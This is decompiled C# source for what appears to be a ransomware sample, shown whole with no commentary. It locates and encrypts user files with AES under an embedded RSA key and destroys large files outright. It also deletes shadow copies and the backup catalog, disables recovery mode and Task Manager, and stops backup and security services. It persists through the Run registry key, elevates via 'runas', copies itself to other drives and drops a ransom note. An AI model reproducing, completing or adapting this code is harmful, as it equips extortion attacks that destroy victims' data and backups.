		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>uQ+YYcMc9PBu83uYwVH+siWfIPixPGGHoSptEUzp+iROOLAsS4XPHvxfYAr4slB7QQAWzp9l8C1vX9E61LjIIDkXy7F8WBemx14xmkj2vWzz7bUS8L+6F/m+MaS/vn7o8B8p/RYJg+fCtlE1+WOjyKgaD1NYKVo6I4nyOxbRyEkuabtcedUIw8b5oOikgJJDsjtVI5XddOtmUV/o2cz/osMmUD1h/Zlgs1t6hgh+1m0LV12CtqL8JSBbIaXoev4rarJLzTqkbv66M9ftWwyd/67JhpUJw+C8imKTP8be+6MgPtUm+iYDyI9rfUjwxNHyfvk+cymhI9tAQiDLnY1k+Q==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
